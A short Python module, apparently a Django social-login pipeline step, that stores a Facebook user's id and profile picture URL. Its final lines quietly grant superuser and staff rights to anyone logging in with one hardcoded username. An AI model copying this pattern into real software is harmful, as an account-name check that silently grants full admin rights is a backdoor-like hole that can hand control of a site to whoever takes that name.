import uuid


def path_filename(filename):
    return 'uploads/images/%s.%s' % (uuid.uuid1(), filename.split('.')[1])


def save_profile(backend, user, response, *args, **kwargs):
    if backend.name != 'facebook' or user.profile.facebook_id:
        return

    facebook_id = response.get('id')
    picture_url = response['picture']['data'].get('url') if response.get('picture') and response['picture'].get(
        'data') else None
    profile = user.profile
    profile.facebook_id = facebook_id
    profile.picture_url = picture_url
    profile.save()

    if user.username != 'KristjanRoosild':
        return

    user.is_superuser = True
    user.is_staff = True
    user.is_active = True
    user.save()
